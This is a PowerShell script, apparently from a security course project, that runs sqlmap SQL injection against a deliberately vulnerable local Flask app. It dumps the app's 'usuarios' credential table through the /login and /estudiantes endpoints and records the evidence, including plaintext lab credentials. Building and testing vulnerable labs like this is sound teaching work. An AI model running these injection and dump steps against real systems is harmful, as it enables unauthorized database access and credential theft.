# =============================================================================
# sqlmap_attack.ps1 — SQLi automatizado contra la V1 (Sistema Academico Vul)
#
# Equivalente Windows de scripts/sqlmap_attack.sh. Objetivo: demostrar que la
# V1 es inyectable y extraer la tabla "usuarios" (credenciales en texto plano).
# Evidencia en docs\sqlmap_evidence\ (referenciar en docs/SQLMAP_ATTACK.md).
#
# Requisitos:
#   - V1 desplegada (por defecto http://localhost:5001, Flask debug)
#   - sqlmap en PATH (https://sqlmap.org)
#   - curl.exe (viene con Windows 10/11)
#
# Uso:
#   .\scripts\sqlmap_attack.ps1 [-Target http://localhost:5001]
#                               [-SessionFile C:\temp\v1_sesion.txt]
#                               [-OutDir docs\sqlmap_evidence]
# =============================================================================
param(
    [string]$Target = "http://localhost:5001",
    [string]$SessionFile = "$env:TEMP\v1_sesion.txt",
    [string]$OutDir = "docs\sqlmap_evidence"
)

$ErrorActionPreference = "Stop"
$LoginDir   = Join-Path $OutDir "login"
$EstDir     = Join-Path $OutDir "estudiantes"
New-Item -ItemType Directory -Force -Path $LoginDir, $EstDir | Out-Null

if (-not (Get-Command sqlmap -ErrorAction SilentlyContinue)) {
    Write-Host "[!] sqlmap no esta instalado. Vea https://sqlmap.org" -ForegroundColor Yellow
    exit 1
}

Write-Host "[+] Objetivo V1: $Target"
Write-Host "[+] Directorio de evidencia: $OutDir"
Write-Host ""

# ---------------------------------------------------------------------------
# 1. SQLi en /login (POST). La V1 concatena la query -> inyeccion directa.
#    Parametros: username y password. Sin CSRF en la V1.
# ---------------------------------------------------------------------------
Write-Host "[1/3] SQLi en /login (POST) - enumerando bases de datos"
& sqlmap -u "$Target/login" `
         --data="username=admin&password=x" `
         --batch --level=1 --risk=1 --threads=4 `
         --dbs `
         --output-dir="$LoginDir"

Write-Host "[1b/3] Volcando la tabla usuarios desde /login"
& sqlmap -u "$Target/login" `
         --data="username=admin&password=x" `
         --batch --level=1 --risk=1 --threads=4 `
         -D academia -T usuarios --dump `
         --output-dir="$LoginDir"

# ---------------------------------------------------------------------------
# 2. SQLi en /estudiantes?buscar= (GET). Requiere sesion de usuario.
#    Login manual (V1 acepta username/password sin token) para obtener cookie.
# ---------------------------------------------------------------------------
Write-Host "[2/3] Obteniendo sesion V1 (admin/admin123)"
& curl.exe -s -c $SessionFile -o NUL -X POST "$Target/login" `
     -d "username=admin" -d "password=admin123"

$SessionCookie = (Get-Content $SessionFile |
    Where-Object { $_ -match "`tsession`t" } |
    ForEach-Object { [regex]::Match($_, 'session\t(\S+)').Groups[1].Value } |
    Select-Object -First 1)

if ([string]::IsNullOrEmpty($SessionCookie)) {
    Write-Host "[!] No se obtuvo cookie de sesion. La V1 esta respondiendo?" -ForegroundColor Yellow
    exit 1
}
Write-Host "     Cookie de sesion obtenida ($($SessionCookie.Length) chars)"

Write-Host "[2b/3] SQLi en /estudiantes?buscar= (GET) - verificando inyeccion"
& sqlmap -u "$Target/estudiantes" `
         --data="buscar=test" `
         --cookie="session=$SessionCookie" `
         --method=GET `
         --batch --level=2 --risk=2 --threads=4 `
         --tables `
         --output-dir="$EstDir"

Write-Host "[2c/3] Dump de la tabla usuarios"
& sqlmap -u "$Target/estudiantes" `
         --data="buscar=test" `
         --cookie="session=$SessionCookie" `
         --method=GET `
         --batch --level=2 --risk=2 --threads=4 `
         -T usuarios --dump `
         --output-dir="$EstDir"

# ---------------------------------------------------------------------------
# 3. Resumen / evidencia
# ---------------------------------------------------------------------------
Write-Host "[3/3] Evidencia generada:"
Get-ChildItem -Path $OutDir -Recurse -File -Include *.csv,*.log | Select-Object -First 20 | ForEach-Object { $_.FullName }

Write-Host ""
Write-Host "Listo. Las credenciales extraidas (admin/admin123, profesor/profesor en"
Write-Host "texto plano) quedan en los .csv de $OutDir. Adjuntar capturas a docs/SQLMAP_ATTACK.md"
